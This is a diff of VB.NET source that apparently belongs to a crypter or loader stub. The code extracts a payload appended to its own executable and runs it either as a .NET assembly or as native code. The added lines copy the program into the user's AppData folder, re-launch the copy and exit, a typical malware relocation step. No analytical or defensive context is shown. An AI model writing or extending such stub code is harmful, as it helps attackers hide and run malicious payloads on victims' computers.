@@ -209,10 +209,24 @@ Class Stuff
 
     Shared Sub Test()
         Dim AppPath As String = Application.ExecutablePath
+
         Dim Payload() As Byte = GetPload(AppPath)
         Dim i As Integer = FindSplit(Payload)
         Dim Start As Integer = i
         If Payload(Start - 8) = &H54 Then
+            'copy self
+            Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+            If AppPath.ToLower.Contains(TmpPath.ToLower) Then
+            Else
+                Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))
+
+                'copy our self to temp and re execute
+                FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+                Process.Start(TmpPath & AppName)
+                End
+            End If
+        End If
+        If Payload(Start - 9) = &H54 Then
             'net
         Else
             'native
@@ -230,7 +244,8 @@ Class Stuff
         Dim NewByts() As Byte = RedimPload(Payload, Start)
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
-        If Payload(Start - 8) = &H54 Then
+
+        If Payload(Start - 9) = &H54 Then
             Dim f As New dll.Class1
             f.Main(Application.ExecutablePath)
         Else
